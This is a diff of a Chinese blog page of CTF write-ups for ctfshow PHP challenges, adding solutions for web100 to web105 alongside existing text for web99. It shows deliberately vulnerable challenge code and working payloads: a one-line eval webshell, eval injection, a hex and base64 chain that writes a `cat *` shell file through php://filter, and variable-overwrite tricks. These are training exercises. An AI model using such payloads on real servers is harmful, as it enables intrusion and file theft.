@@ -29,7 +29,7 @@
 <meta property="og:description" content="前言为了继续巩固php基础！">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2022-12-14T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-12-16T10:02:50.439Z">
+<meta property="article:modified_time" content="2022-12-24T10:59:46.125Z">
 <meta property="article:author" content="Bron">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="PHP">
@@ -129,17 +129,17 @@
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">33</span></a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">34</span></a>
 
   </li>
         <li class="menu-item menu-item-categories">
 
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">31</span></a>
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">32</span></a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">95</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">98</span></a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -224,7 +224,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-12-16 18:02:50" itemprop="dateModified" datetime="2022-12-16T18:02:50+08:00">2022-12-16</time>
+                <time title="修改时间：2022-12-24 18:59:46" itemprop="dateModified" datetime="2022-12-24T18:59:46+08:00">2022-12-24</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -253,14 +253,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>9.9k</span>
+              <span>16k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>9 分钟</span>
+              <span>15 分钟</span>
             </span>
 
         </div>
@@ -364,6 +364,76 @@
 <li>构造payload<br>由于in_array数组有缺陷，会把1.php解析为1，由此我们可构造出一个php文件，通过post传参传入一句话木马：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET: ?n=1.php    POST: content:&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>
 因为是随机数，所以1不一定每次都在数组中，如果失败多试几次便可。<br>然后我们再访问： <code>url/1.php</code><br>成功后打开蚁剑，连接这个url，密码为1。<br>之后找到flag36d.php文件，拿到flag。</li>
 </ol>
+<h1 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h1><ol>
+<li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<ul>
+<li><p>is_numeric()函数<br>检测变量是否为数字或数字字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">is_numeric(mixed $value): bool</span><br><span class="line">如果 value 是数字或数字字符串， 返回 true，否则返回 false。</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>eval()函数<br>把字符串作为PHP代码执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eval(string $code): mixed</span><br><span class="line">返回值</span><br><span class="line">eval() 返回 null，除非在执行的代码中 return 了一个值，函数返回传递给 return 的值。 PHP 7 开始，执行的代码里如果有一个 parse error，eval() 会抛出 ParseError 异常。在 PHP 7 之前， 如果在执行的代码中有 parse error，eval() 返回 false，之后的代码将正常执行。无法使用 set_error_handler() 捕获 eval() 中的解析错误。</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>通过该源码可知，我们需要通过GET方式传入3个参数，并且将判断三个参数是否为数字或数字字符串。<br>检测v2和v3是否具有那些过滤的值，然后用eval函数输出为代码。</p>
+<ol start="2">
+<li>构造payload<br>这里的考点是运算符的优先级，由于在v0这一行代码的比较中，等于（&#x3D;）符号的优先级高于and符号，因此代码会执行为判断v1是否为数字，返回的布尔值传到v0，而v2，v3的判断并没有传入。因此我们可以输入任意v2，v3的字符。<br>由于eval将括号内的字符执行为代码，我们可以用var_dump函数打印出flag，于是构造payload如下：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=1&amp;v2=var_dump($ctfshow)/*&amp;v3=*/;</span><br></pre></td></tr></table></figure>
+最终拿到flag</li>
+</ol>
+<h1 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h1><ol>
+<li><p>查看源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>相比于上一关，本关的黑名单更多，用一般的函数无法拿到flag，于是我们需要想办法使用其它方法。</p>
+</li>
+<li><p>构造语句<br>可以使用ReflectionClass类来显示出flag，ReflectionClass 类报告了一个类的有关信息。<br><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/class.reflectionclass.php">ReflectionClass 类 </a><br>构造示例如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</span><br></pre></td></tr></table></figure>
+<p>由于hint说flag最后少了一位，因此需要最后爆破16次。<br>拿到flag</p>
+</li>
+</ol>
+<h1 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h1><ol>
+<li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<ul>
+<li><p>substr()函数<br>返回字符串的子串</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">substr(string $string, int $offset, ?int $length = null): string</span><br><span class="line">string</span><br><span class="line">输入字符串。</span><br><span class="line">offset</span><br><span class="line">如果 offset 是非负数，返回的字符串将从 string 的 offset 位置开始，从 0 开始计算。</span><br><span class="line">例如，在字符串 “abcdef” 中，在位置 0 的字符是 “a”，位置 2 的字符串是 “c” 等等。</span><br><span class="line">如果 offset 是负数，返回的字符串将从 string 结尾处向前数第 offset 个字符开始。</span><br><span class="line">如果 string 的长度小于 offset，将返回空字符串。</span><br><span class="line">length</span><br><span class="line">如果提供了正数的 length，返回的字符串将从 offset 处开始最多包括 length 个字符（取决于 string 的长度）。</span><br><span class="line">如果提供了负数的 length，那么 string 末尾处的 length 个字符将会被省略（若 offset 是负数则从字符串尾部算起）。</span><br><span class="line">如果 offset 不在这段文本中，那么将返回空字符串。</span><br><span class="line">如果提供了值为 0 的 length，那么将返回一个空字符串。</span><br><span class="line">如果忽略 length 或为 null，返回的子字符串将从 offset 位置开始直到字符串结尾。</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>call_user_func()函数<br>把第一个参数作为回调函数调用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(callable $callback, mixed ...$args): mixed</span><br><span class="line">callback</span><br><span class="line">将被调用的回调函数</span><br><span class="line">args</span><br><span class="line">0个或以上的参数，被传入回调函数。</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>hex2bin()函数<br>转换十六进制字符串为ASCII字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hex2bin(string $string): string|false</span><br><span class="line">string</span><br><span class="line">十六进制表示的数据</span><br><span class="line">返回值</span><br><span class="line">返回给定数据的ASCII字符串表示 或者在失败时返回 false。</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>根据源码可知，传入1个POST参数v1，2个GET参数v2,v3<br>根据v4的表达式，可知v2必须为数字或数字字符串（可以使用科学计数法）。v3不受限制。<br>从第3个数字开始截取v2一直到结尾，送给变量s。<br>调用call_user_func()函数，将v3作为函数名调用，传入s作为参数。得到的值赋给变量str。<br>最后v3作为文件名，变量str的值写入v3文件中。</p>
+<ol start="2">
+<li>构造payload<br>由于is_numeric()函数只允许使用数字和e（科学计数法），不能包含其它字符，所以需要构造仅含数字和e的参数。<br>由此我们可以想到把内容通过base64加密，之后转化为16进制字符串，找到符合条件的语句。<br>最终我们通过下面代码找到了：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;&lt;?=`cat *`;&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$a</span>);  <span class="comment">// $b=&quot;PD89YGNhdCAqYDs=&quot;,由于等号(=)只是作为填充位，不影响最终结果，因此可以删去 </span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">bin2hex</span>(<span class="string">&quot;PD89YGNhdCAqYDs&quot;</span>);  <span class="comment">// $c=5044383959474e6864434171594473,符合条件</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+由于是从v2的第3位开始截取，因此前两位需要填充任意数字，最终得到v2为：<br><code>005044383959474e6864434171594473</code><br>由于file_put_contents()函数允许使用伪协议，于是通过PHP伪协议写入文件，因此我们可以将v3构造为：<br><code>php://filter/write=convert.base64-decode/resource=a.php</code><br>v1为POST传参：<br><code>hex2bin</code></li>
+</ol>
+<p>构造完成后提交，访问a.php，查看源代码。<br>即可拿到flag</p>
+<h1 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h1><p>和web102相同</p>
+<h1 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h1><p>很简单，要两个SHA1值相同，但没有验证本身值是否不同，因此直接传入两个相同的值即可拿到flag。<br>但本意应该是考察SHA1加解密的缺陷：<br>sha1()函数无法处理数组类型，将报错并返回false<br>sha1()函数的弱相等<br>或者用科学计数法（0exxx）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v1=aaK1STfY    //0e76658526655756207688271159624026011393</span><br><span class="line">v2=aaO8zKZF    //0e89257456677279068558073954252716165668</span><br></pre></td></tr></table></figure>
+<p>最简单的payload:<br>GET:v1&#x3D;1<br>POST:v2&#x3D;1<br>拿到flag</p>
+<h1 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h1><ol>
+<li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$error</span>=<span class="string">&#x27;你还想要flag嘛？&#x27;</span>;</span><br><span class="line"><span class="variable">$suces</span>=<span class="string">&#x27;既然你想要那给你吧！&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;<span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$suces</span>);</span><br></pre></td></tr></table></figure></li>
+</ol>
+<ul>
+<li><p>error_reporting()函数<br>设置应该报告何种 PHP 错误</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(?int $error_level = null): int</span><br><span class="line">error_reporting() 函数能够在运行时设置 error_reporting 指令。</span><br><span class="line">PHP 有诸多错误级别，使用该函数可以设置在脚本运行时的级别。</span><br><span class="line">如果没有设置可选参数 error_level， error_reporting() 仅会返回当前的错误报告级别。</span><br><span class="line">// 关闭所有PHP错误报告</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">// Report simple running errors</span><br><span class="line">error_reporting(E_ERROR | E_WARNING | E_PARSE);</span><br><span class="line"></span><br><span class="line">// 报告 E_NOTICE (报告未初始化的变量</span><br><span class="line">// 或者捕获变量名的错误拼写)</span><br><span class="line">error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);</span><br><span class="line"></span><br><span class="line">// 除了 E_NOTICE，报告其他所有错误</span><br><span class="line">error_reporting(E_ALL ^ E_NOTICE);</span><br><span class="line"></span><br><span class="line">// 报告所有 PHP 错误</span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line"></span><br><span class="line">// 报告所有 PHP 错误</span><br><span class="line">error_reporting(-1);</span><br><span class="line"></span><br><span class="line">// 和 error_reporting(E_ALL); 一样</span><br><span class="line">ini_set(&#x27;error_reporting&#x27;, E_ALL);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>foreach<br>foreach 语法结构提供了遍历数组的简单方式。foreach 仅能够应用于数组和对象，如果尝试应用于其他数据类型的变量，或者未初始化的变量将发出错误信息。有两种语法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">foreach (iterable_expression as $value)</span><br><span class="line">    statement</span><br><span class="line">foreach (iterable_expression as $key =&gt; $value)</span><br><span class="line">    statement</span><br><span class="line">第一种格式遍历给定的 iterable_expression 迭代器。每次循环中，当前单元的值被赋给 $value。</span><br><span class="line">第二种格式做同样的事，只除了当前单元的键名也会在每次循环中被赋给变量 $key。</span><br><span class="line">注意 foreach 不会修改类似 current() 和 key() 函数所使用的数组内部指针。</span><br><span class="line">还能够自定义遍历对象。</span><br><span class="line">可以很容易地通过在 $value 之前加上 &amp; 来修改数组的元素。此方法将以引用赋值而不是拷贝一个值。</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>die()函数<br>等同于exit(), 输出一个消息并且退出当前脚本。</p>
+</li>
+<li><p>$$变量覆盖<br><a target="_blank" rel="noopener" href="https://www.ineedyou.xyz/archives/87/">变量覆盖的知识</a></p>
+</li>
+</ul>
+<p>从源码可以看出，我们GET不能传: <code>error=xx</code>  POST不能传: <code>xxx=flag</code><br>并且GET传参和POST传参均会进行变量覆盖。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br></pre></td></tr></table></figure>
+<p>这条if语句如果不饶过，就不能使用变量error。若想要绕过要么已知flag的值，要么设置值为空。<br>看需求是否用到error考虑需不需要绕过。</p>
+<ol start="2">
+<li>构造payload<br>分析源码后，我们GET需要传入：<br><code>suces=flag</code><br>这样做的目的是为了将变量flag的值传入变量suces，并且变量flag的值被清空。<br>并且POST传入：<br><code>error=suces</code><br>这样一来， <code>$_POST[&#39;flag&#39;]==$flag</code> 便返回false，最终if语句将执行die函数。<br>而变量error的值为suces的值，即原来flag的值。那么将会输出flag。<br>这样就拿到flag了。</li>
+</ol>
+<p>或者POST也可以为：<br><code>flag=</code><br>这样一来， <code>$_POST[&#39;flag&#39;]==$flag</code> 便返回true，最终if语句不会执行die函数。<br>转而继续往下执行，最后输出变量suces的值，也即flag的值（因为已经变量覆盖了，$flag就是$suces）<br>最终拿到flag</p>
 
     </div>
 
@@ -515,7 +585,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web89"><span class="nav-number">2.</span> <span class="nav-text">web89</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web90"><span class="nav-number">3.</span> <span class="nav-text">web90</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web91"><span class="nav-number">4.</span> <span class="nav-text">web91</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web92"><span class="nav-number">5.</span> <span class="nav-text">web92</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web93"><span class="nav-number">6.</span> <span class="nav-text">web93</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web94"><span class="nav-number">7.</span> <span class="nav-text">web94</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web95"><span class="nav-number">8.</span> <span class="nav-text">web95</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web96"><span class="nav-number">9.</span> <span class="nav-text">web96</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web97"><span class="nav-number">10.</span> <span class="nav-text">web97</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web98"><span class="nav-number">11.</span> <span class="nav-text">web98</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web99"><span class="nav-number">12.</span> <span class="nav-text">web99</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web89"><span class="nav-number">2.</span> <span class="nav-text">web89</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web90"><span class="nav-number">3.</span> <span class="nav-text">web90</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web91"><span class="nav-number">4.</span> <span class="nav-text">web91</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web92"><span class="nav-number">5.</span> <span class="nav-text">web92</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web93"><span class="nav-number">6.</span> <span class="nav-text">web93</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web94"><span class="nav-number">7.</span> <span class="nav-text">web94</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web95"><span class="nav-number">8.</span> <span class="nav-text">web95</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web96"><span class="nav-number">9.</span> <span class="nav-text">web96</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web97"><span class="nav-number">10.</span> <span class="nav-text">web97</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web98"><span class="nav-number">11.</span> <span class="nav-text">web98</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web99"><span class="nav-number">12.</span> <span class="nav-text">web99</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web100"><span class="nav-number">13.</span> <span class="nav-text">web100</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web101"><span class="nav-number">14.</span> <span class="nav-text">web101</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web102"><span class="nav-number">15.</span> <span class="nav-text">web102</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web103"><span class="nav-number">16.</span> <span class="nav-text">web103</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web104"><span class="nav-number">17.</span> <span class="nav-text">web104</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web105"><span class="nav-number">18.</span> <span class="nav-text">web105</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -531,20 +601,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">95</span>
+          <span class="site-state-item-count">98</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">31</span>
+        <span class="site-state-item-count">32</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">33</span>
+        <span class="site-state-item-count">34</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -602,13 +672,13 @@
